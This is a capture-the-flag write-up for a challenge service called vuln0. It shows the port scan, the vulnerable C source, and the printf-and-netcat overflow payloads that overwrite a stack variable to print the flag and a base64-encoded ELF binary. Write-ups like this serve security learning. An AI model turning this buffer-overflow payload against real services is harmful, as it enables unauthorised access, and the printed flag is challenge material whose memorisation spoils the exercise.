# Challenge 4

## vuln0

While enumerating the host it's clear that port 1984 is for this challenge:

```
PORT     STATE SERVICE     VERSION
1984/tcp open  bigbrother?
| fingerprint-strings:
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, GenericLines, GetRequest, HTTPOptions, Help, RPCCheck, RTSPRequest, SSLSessionReq:
|     For a moment, nothing happened. Then, after a second or so, nothing continued to happen.
|     long and thanks for all the fish.
|   NULL:
|_    For a moment, nothing happened. Then, after a second or so, nothing continued to happen.
```

Using netcat to connect it's clear this is a reverse engineering challenge as it takes input and closes the connection on the wrong answer:
```
root@kali:~/h4ckm3/4# nc canyouhack.us 1984
For a moment, nothing happened. Then, after a second or so, nothing continued to happen.
> A
So long and thanks for all the fish.
root@kali:~/h4ckm3/4#
````

### Source Code

```c
/* exec /usr/bin/socat tcp4-l:$port,fork,reuseaddr exec:/challenges/vuln0 */

#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/stat.h>  
#include <sys/sendfile.h>

int readfile(char* fname) {

	int fd = -1;
	struct stat fdstat;

	fd = open(fname, O_RDONLY);
	if (fd < 0) {
		perror("open");
		exit(EXIT_FAILURE);
	}

	if (fstat(fd, &fdstat) == -1) {
		perror("fstat");
		exit(EXIT_FAILURE);
	}

	if (sendfile(STDOUT_FILENO, fd, 0, fdstat.st_size) < 0) {                                              
        perror("write");
		exit(EXIT_FAILURE);
    }

	close(fd);
}	                                                                                     


int play() {

	int a;
	int b;
	char buffer[010];
	a = 0x41414141;
	b = 0x42424242;

	if (write(STDOUT_FILENO, "For a moment, nothing happened. Then, after a second or so, nothing continued to happen.\n> ", 91) < 0) {
		perror("write");
	}

    if (read(STDIN_FILENO, &buffer, 0xC) < 0) {                                              
        perror("read");                                                                   
    }

	if (a == 31337) {
		system(buffer);
	}

	else if (b == 1337) {
		readfile("flag.0");
	}

	else if (b == 42) {
		readfile("vuln1.txt");
	}

	else {
		write(STDOUT_FILENO, "So long and thanks for all the fish.\n", 37);
	}

}


int main(int argc, char *argv[]){
	play();
	exit(EXIT_SUCCESS);
}

```

In the source code we see that the `char buffer` and both the `a` variable and `b` variable are clearly defined, it's also clear what condition would give us our flag:

```c
int a;
int b;
char buffer[010];      // 8 bytes
a = 0x41414141;        // AAAAAAAA : 0x00007A69 : 31337
b = 0x42424242;        // BBBBBBBB : 0x00000539 : 1337


if (a == 31337) {
  system(buffer);
}

else if (b == 1337) {
  readfile("flag.0");
}

else if (b == 42) {
  readfile("vuln1.txt");
}
```

Passing that data over netcat back to the host gets the flag:
```
root@kali:~/h4ckm3/4# printf 'xxxxxxxx\x39\x05\x00\x00' | nc canyouhack.us 1984                                                                    
For a moment, nothing happened. Then, after a second or so, nothing continued to happen.                                                           
> Congratulations! Here is your flag: 2661b14c-f490-48d7-9d9e-d166f0fd8205  
```

Changing the payload to `xxxxxxxx\x2A\x00\x00\x00` (42) also reads out `vuln1.txt`

```
root@kali:~/h4ckm3/4# printf 'xxxxxxxx\x2A\x00\x00\x00' | nc canyouhack.us 1984                                                                     
For a moment, nothing happened. Then, after a second or so, nothing continued to happen.                                                           
> f0VMRgEBAQAAAAAAAAAAAAIAAwABAAAAQIUECDQAAAB4EQAAAAAAADQAIAAJACgAHAAbAAYAAAA0           
AAAANIAECDSABAggAQAAIAEAAAUAAAAEAAAAAwAAAFQBAABUgQQIVIEECBMAAAATAAAABAAAAAEA
AAABAAAAAAAAAACABAgAgAQILAwAACwMAAAFAAAAABAAAAEAAAAIDwAACJ8ECAifBAhUAQAAYAEA
AAYAAAAAEAAAAgAAABQPAAAUnwQIFJ8ECOgAAADoAAAABgAAAAQAAAAEAAAAaAEAAGiBBAhogQQI
RAAAAEQAAAAEAAAABAAAAFDldGTYCgAA2IoECNiKBAhEAAAARAAAAAQAAAAEAAAAUeV0ZAAAAAAA
AAAAAAAAAAAAAAAAAAAABwAAABAAAABS5XRkCA8AAAifBAgInwQI+AAAAPgAAAAEAAAAAQAAAC9s
aWIvbGQtbGludXguc28uMgAABAAAABAAAAABAAAAR05VAAAAAAACAAAABgAAABgAAAAEAAAAFAAA
AAMAAABHTlUAJkvyfEq4uoMkaeOWD6VO0AbnpGgCAAAADgAAAAEAAAAFAAAAACMAIA4AAAAPAAAA
KR2MHK1L48AAAAAAAAAAAAAAAAAAAAAATwAAAAAAAAAAAAAAEgAAAEgAAAAAAAAAAAAAABIAAAAa
AAAAAAAAAAAAAAASAAAALAAAAAAAAAAAAAAAEgAAAEMAAAAAAAAAAAAAABIAAAB4AAAAAAAAAAAA
AAAgAAAAIQAAAAAAAAAAAAAAEgAAAGEAAAAAAAAAAAAAABIAAAAmAAAAAAAAAAAAAAASAAAAZgAA
AAAAAAAAAAAAEgAAADMAAAAAAAAAAAAAABIAAAAnAAAAAAAAAAAAAAASAAAAWwAAAAAAAAAAAAAA
EgAAAFQAAABgoAQIBAAAABEAGQALAAAA7IgECAQAAAARAA8AAGxpYmMuc28uNgBfSU9fc3RkaW5f
dXNlZABmZmx1c2gAZXhpdABzcmFuZABwZXJyb3IAX19pc29jOTlfc3NjYW5mAHB1dHMAcHJpbnRm
AHJlYWQAc3Rkb3V0AGNsb3NlAG9wZW4AX19saWJjX3N0YXJ0X21haW4AX19nbW9uX3N0YXJ0X18A
R0xJQkNfMi43AEdMSUJDXzIuMAAAAAACAAIAAgACAAIAAAACAAIAAgACAAMAAgACAAIAAQABAAIA
AQAAABAAAAAAAAAAF2lpDQAAAwCHAAAAEAAAABBpaQ0AAAIAkQAAAAAAAAD8nwQIBgYAAGCgBAgF
DgAADKAECAcBAAAQoAQIBwIAABSgBAgHAwAAGKAECAcEAAAcoAQIBwUAACCgBAgHBgAAJKAECAcH
AAAooAQIBwgAACygBAgHCQAAMKAECAcKAAA0oAQIBwsAADigBAgHDAAAPKAECAcNAABTg+wI6DMB
AACBw8MbAACLg/z///+FwHQF6G4AAACDxAhbwwAAAAAAAAAAAP81BKAECP8lCKAECAAAAAD/JQyg
BAhoAAAAAOng/////yUQoAQIaAgAAADp0P////8lFKAECGgQAAAA6cD/////JRigBAhoGAAAAOmw
/////yUcoAQIaCAAAADpoP////8lIKAECGgoAAAA6ZD/////JSSgBAhoMAAAAOmA/////yUooAQI
aDgAAADpcP////8lLKAECGhAAAAA6WD/////JTCgBAhoSAAAAOlQ/////yU0oAQIaFAAAADpQP//
//8lOKAECGhYAAAA6TD/////JTygBAhoYAAAAOkg////Me1eieGD5PBQVFJo0IgECGhgiAQIUVZo
34YECOif////9GaQZpBmkGaQZpBmkGaQixwkw2aQZpBmkGaQZpBmkLhfoAQILVygBAiD+AZ3AcO4
AAAAAIXAdPZVieWD7BjHBCRcoAQI/9DJw422AAAAALhcoAQILVygBAjB+AKJwsHqHwHQ0fh1AcO6
AAAAAIXSdPZVieWD7BiJRCQExwQkXKAECP/SycOJ9o28JwAAAACAPWSgBAgAdRNVieWD7AjofP//
/8YFZKAECAHJ88NmkKEQnwQIhcB0H7gAAAAAhcB0FlWJ5YPsGMcEJBCfBAj/0Mnpef///5Dpc///
/1WJ5f/kXcNVieWD7BDHRfwAAAAAx0X4AAAAAMdF+AAAAADrEItF/MHgBIPAColF/INF+AGDffgH
duqLRfyLVQgx0MnDVYnlg+xooUygBAiJBCToHP7//6FgoAQIiQQk6O/9///HRCQIAAEAAI1FtolE
JATHBCQAAAAA6LT9//+FwHkYxwQkm4oECOjU/f//xwQkAQAAAOj4/f//uAAAAADJw1WJ5YPk8IHs
kAAAAMdEJAQAAAAAxwQkoIoECOjh/f//iYQkjAAAAIO8JIwAAAAAeRjHBCSsigQI6IT9///HBCQB
AAAA6Kj9///HRCQIBAAAAI1EJHyJRCQEi4QkjAAAAIkEJOgp/f//hcB5GMcEJL+KBAjoSf3//8cE
JAEAAADobf3//4uEJIwAAACJBCTovv3//4tEJHyJBCTocv3//+id/f//iYQkiAAAAIuEJIgAAACJ
BCToq/7//4mEJIQAAAChWKAECIuUJIQAAACJVCQEiQQk6Mj8//+hYKAECIkEJOjL/P//x0QkCGQA
AACNRCQUiUQkBMcEJAAAAADoj/z//4mEJIAAAACDvCSAAAAAAHkYxwQkm4oECOii/P//xwQkAQAA
AOjG/P//jUQkeIlEJAjHRCQE0ooECI1EJBSJBCTo6vz//4tEJHg7hCSIAAAAdRToSf7//6FQoAQI
iQQk6Gv8///rDaFUoAQIiQQk6Fz8//+4AAAAAMnDZpBmkJBVVzH/VlPoBf3//4HDlRcAAIPsHIts
JDCNswz////osfv//42DCP///ynGwf4ChfZ0J422AAAAAItEJDiJLCSJRCQIi0QkNIlEJAT/lLsI
////g8cBOfd134PEHFteX13D6w2QkJCQkJCQkJCQkJCQ88MAAFOD7Ajok/z//4HDIxcAAIPECFvD
AwAAAAEAAgBTZWN1cml0eSBJbm5vdmF0aW9uIHJvY2tzIQAAVGhlIGR1bmdlb24gc2hha2VzIGFz
IHRoZSBkb29yIG9wZW5zLiBZb3UgZmVlbCBleWVzIGdhemluZyBvdXQgYXQgeW91Lgo+IAAAAEFu
IGVuZXJnaXplZCBjbG91ZCBvZiBkdXN0IGJlZ2lucyB0byBjb2FsZXNjZS4KAFlvdSBoZWFyIGxh
dWdodGVyIGluIHRoZSBkYXJrbmVzcy4gQSB0cmFwIGRvb3Igb3BlbnMgYmVsb3cgeW91ISBZb3Ug
ZmFsbCBpbnRvIGEgY2hhc20uCgBZb3UgYXJlIGx1Y2t5LiBGdWxsIG1vb24gdG9uaWdodC4gWW91
IGhlYXIgc29tZSBub2lzZXMuIApXYWl0ISBUaGVyZSdzIHNvbWV0aGluZyB0aGVyZSB5b3UgY2Fu
J3Qgc2VlISBJdCdzIGEgZG9vciEgCkEgdm9pY2Ugd2hpc3BlcnM6ICJUaGUgYW5zd2VyIGlzICV1
LiBTcGVhayB0aGUgcXVlc3Rpb24gYW5kIGVudGVyLiIKPiAAcmVhZAAvZGV2L3JhbmRvbQBvcGVu
IFsvZGV2L3JhbmRvbV0AcmVhZCBbL2Rldi9yYW5kb21dACV1AAAAAAEbAztAAAAABwAAAIj5//9c
AAAAZfv//4AAAABs+///oAAAAKn7///AAAAAB/z//+AAAACI/f//AAEAAPj9//88AQAAFAAAAAAA
AAABelIAAXwIARsMBASIAQAAIAAAABwAAAAk+f//4AAAAAAOCEYODEoPC3QEeAA/GjsqMiQiHAAA
AEAAAADd+v//BwAAAABBDgiFAkINBUPFDAQEAAAcAAAAYAAAAMT6//89AAAAAEEOCIUCQg0FecUM
BAQAABwAAACAAAAA4fr//14AAAAAQQ4IhQJCDQUCWsUMBAQAHAAAAKAAAAAf+///fAEAAABBDgiF
AkINBQN4AcUMBAQ4AAAAwAAAAID8//9hAAAAAEEOCIUCQQ4MhwNDDhCGBEEOFIMFTg4wAkgOFEHD
DhBBxg4MQccOCEHFDgQQAAAA/AAAALT8//8CAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQhgQI8IUECAAAAAABAAAAAQAAAAwAAAA0hAQI
DQAAANSIBAgZAAAACJ8ECBsAAAAEAAAAGgAAAAyfBAgcAAAABAAAAPX+/2+sgQQIBQAAANCCBAgG
AAAA0IEECAoAAACbAAAACwAAABAAAAAVAAAAAAAAAAMAAAAAoAQIAgAAAGgAAAAUAAAAEQAAABcA
AADMgwQIEQAAALyDBAgSAAAAEAAAABMAAAAIAAAA/v//b4yDBAj///9vAQAAAPD//29sgwQIAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABSfBAgAAAAA
AAAAAHaEBAiGhAQIloQECKaEBAi2hAQIxoQECNaEBAjmhAQI9oQECAaFBAgWhQQIJoUECDaFBAgA
AAAAAAAAAPCIBAgMiQQIWIkECIiJBAjgiQQIR0NDOiAoVWJ1bnR1IDQuOC4yLTE5dWJ1bnR1MSkg
NC44LjIAAC5zaHN0cnRhYgAuaW50ZXJwAC5ub3RlLkFCSS10YWcALm5vdGUuZ251LmJ1aWxkLWlk
AC5nbnUuaGFzaAAuZHluc3ltAC5keW5zdHIALmdudS52ZXJzaW9uAC5nbnUudmVyc2lvbl9yAC5y
ZWwuZHluAC5yZWwucGx0AC5pbml0AC50ZXh0AC5maW5pAC5yb2RhdGEALmVoX2ZyYW1lX2hkcgAu
ZWhfZnJhbWUALmluaXRfYXJyYXkALmZpbmlfYXJyYXkALmpjcgAuZHluYW1pYwAuZ290AC5nb3Qu
cGx0AC5kYXRhAC5ic3MALmNvbW1lbnQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAACwAAAAEAAAACAAAAVIEECFQBAAATAAAAAAAAAAAAAAABAAAAAAAAABMAAAAHAAAA
AgAAAGiBBAhoAQAAIAAAAAAAAAAAAAAABAAAAAAAAAAhAAAABwAAAAIAAACIgQQIiAEAACQAAAAA
AAAAAAAAAAQAAAAAAAAANAAAAPb//28CAAAArIEECKwBAAAkAAAABQAAAAAAAAAEAAAABAAAAD4A
AAALAAAAAgAAANCBBAjQAQAAAAEAAAYAAAABAAAABAAAABAAAABGAAAAAwAAAAIAAADQggQI0AIA
AJsAAAAAAAAAAAAAAAEAAAAAAAAATgAAAP///28CAAAAbIMECGwDAAAgAAAABQAAAAAAAAACAAAA
AgAAAFsAAAD+//9vAgAAAIyDBAiMAwAAMAAAAAYAAAABAAAABAAAAAAAAABqAAAACQAAAAIAAAC8
gwQIvAMAABAAAAAFAAAAAAAAAAQAAAAIAAAAcwAAAAkAAAACAAAAzIMECMwDAABoAAAABQAAAAwA
AAAEAAAACAAAAHwAAAABAAAABgAAADSEBAg0BAAAIwAAAAAAAAAAAAAABAAAAAAAAAB3AAAAAQAA
AAYAAABghAQIYAQAAOAAAAAAAAAAAAAAABAAAAAEAAAAggAAAAEAAAAGAAAAQIUECEAFAACSAwAA
AAAAAAAAAAAQAAAAAAAAAIgAAAABAAAABgAAANSIBAjUCAAAFAAAAAAAAAAAAAAABAAAAAAAAACO
AAAAAQAAAAIAAADoiAQI6AgAAO0BAAAAAAAAAAAAAAQAAAAAAAAAlgAAAAEAAAACAAAA2IoECNgK
AABEAAAAAAAAAAAAAAAEAAAAAAAAAKQAAAABAAAAAgAAAByLBAgcCwAAEAEAAAAAAAAAAAAABAAA
AAAAAACuAAAADgAAAAMAAAAInwQICA8AAAQAAAAAAAAAAAAAAAQAAAAAAAAAugAAAA8AAAADAAAA
DJ8ECAwPAAAEAAAAAAAAAAAAAAAEAAAAAAAAAMYAAAABAAAAAwAAABCfBAgQDwAABAAAAAAAAAAA
AAAABAAAAAAAAADLAAAABgAAAAMAAAAUnwQIFA8AAOgAAAAGAAAAAAAAAAQAAAAIAAAA1AAAAAEA
AAADAAAA/J8ECPwPAAAEAAAAAAAAAAAAAAAEAAAABAAAANkAAAABAAAAAwAAAACgBAgAEAAAQAAA
AAAAAAAAAAAABAAAAAQAAADiAAAAAQAAAAMAAABAoAQIQBAAABwAAAAAAAAAAAAAAAQAAAAAAAAA
6AAAAAgAAAADAAAAYKAECFwQAAAIAAAAAAAAAAAAAAAgAAAAAAAAAO0AAAABAAAAMAAAAAAAAABc
EAAAJAAAAAAAAAAAAAAAAQAAAAEAAAABAAAAAwAAAAAAAAAAAAAAgBAAAPYAAAAAAAAAAAAAAAEA
AAAAAAAA
```
